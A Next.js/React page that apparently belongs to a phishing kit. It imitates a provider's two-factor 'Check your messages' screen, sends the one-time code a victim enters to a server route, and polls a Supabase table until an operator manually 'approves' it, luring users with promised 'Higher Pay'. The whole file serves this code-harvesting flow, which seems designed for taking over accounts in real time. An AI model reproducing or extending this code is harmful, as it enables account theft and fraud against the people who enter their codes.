'use client'

import React, { useState, useEffect } from 'react'
import { useSearchParams, useRouter } from 'next/navigation'
import { supabase } from '@/lib/supabaseClient' // uses your existing frontend supabase client

export default function AuthDetailsPage() {
  const search = useSearchParams()
  const bindId = search.get('id') ?? ''
  const router = useRouter()
  const [code, setCode] = useState('')
  const [loading, setLoading] = useState(false)
  const [msg, setMsg] = useState<string | null>(null)

  useEffect(() => {
    if (!bindId) setMsg('Missing request id')
  }, [bindId])

  // Poll the account_binds row by id to check status (frontend, uses anon key)
  async function pollBindStatus(id: string, timeoutMs = 7 * 60_000) {
    const start = Date.now()
    const shortTimeout = 3 * 60_000 // 3 minutes: show "try after" message if still pending
    let lastStatus: string | null = null

    while (Date.now() - start < timeoutMs) {
      try {
        const { data, error } = await supabase
          .from('account_binds')
          .select('status, step, details_submitted')
          .eq('id', id)
          .limit(1)
          .maybeSingle()

        if (error) {
          console.warn('poll bind status error', error)
        } else if (data) {
          lastStatus = data.status
          const step = Number(data.step ?? 0)
          const detailsSubmitted = !!data.details_submitted

          // unlocked condition: admin set status = 'approved' AND step >= 2 (or details_submitted true)
          if (lastStatus === 'approved' && (step >= 2 || detailsSubmitted)) {
            return { unlocked: true, row: data }
          }

          // If admin used 'approved1' only, don't unlock yet (we require final 'approved')
        }
      } catch (e) {
        console.error('poll error', e)
      }

      if (Date.now() - start >= shortTimeout) {
        // short timeout passed — show "try later" but continue polling
        setMsg('No admin response yet — please try again after 1–2 hours.')
      }

      await new Promise((r) => setTimeout(r, 8000))
    }

    // timed out
    return { unlocked: false, row: null }
  }

  const handleSubmit = async () => {
    if (!bindId) return setMsg('Invalid request id')
    if (!code.trim()) return setMsg('Enter code')

    setLoading(true)
    setMsg('waiting for Oauth...')

    try {
      // Submit details to server route (this updates step=2 and details_submitted=true)
      const res = await fetch('/api/bind-details', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ id: bindId, extra_info: { code }, set_step2: true, set_details_submitted: true }),
      })
      const j = await res.json()
      if (!res.ok) {
        setMsg(j?.error || 'Failed to submit details')
        setLoading(false)
        return
      }

      // After successful write, poll for admin final approval (status === 'approved' + step>=2)
      setMsg('Submitted. Waiting for OAUTH to approve (may take a few minutes)...')

      const { unlocked } = await pollBindStatus(bindId)

      setLoading(false)

      if (unlocked) {
        // unlocked — go to premium immediately
        setMsg('✅ Approved — unlocking Higher Pay.')
        router.push('/premium')
        return
      } else {
        // not unlocked (timeout) — tell user to check back
        setMsg('No approval yet. Oauth may take time — check back later')
        return
      }
    } catch (e) {
      console.error(e)
      setMsg('Error submitting details. Try again.')
      setLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-white p-6 flex justify-center items-start">
      <div className="max-w-md w-full space-y-6">
        <div className="rounded-xl overflow-hidden">
          <img src="/premium-header.png" alt="header" className="w-full h-40 object-cover" />
        </div>

        <div>
          <h2 className="text-2xl font-semibold">Check your messages</h2>
          <p className="text-sm text-gray-600 mt-1">Enter the verification code sent to your account.</p>
        </div>

        <div className="bg-gray-50 p-4 rounded-xl">
          <input
            value={code}
            onChange={(e) => setCode(e.target.value)}
            placeholder="Code"
            className="w-full rounded-xl border px-4 py-3 text-black focus:outline-none focus:ring-2 focus:ring-blue-200"
          />
        </div>

        <button onClick={handleSubmit} disabled={loading} className="w-full rounded-full py-3 bg-blue-600 text-white font-semibold">
          {loading ? 'Submitting...' : 'Continue'}
        </button>

        <div className="text-center text-sm text-gray-600">If you prefer another way, choose "Try another way" below.</div>
        <button className="w-full rounded-full py-3 border">Try another way</button>

        {msg && <div className="mt-2 text-sm text-center text-gray-700">{msg}</div>}
      </div>
    </div>
  )
}
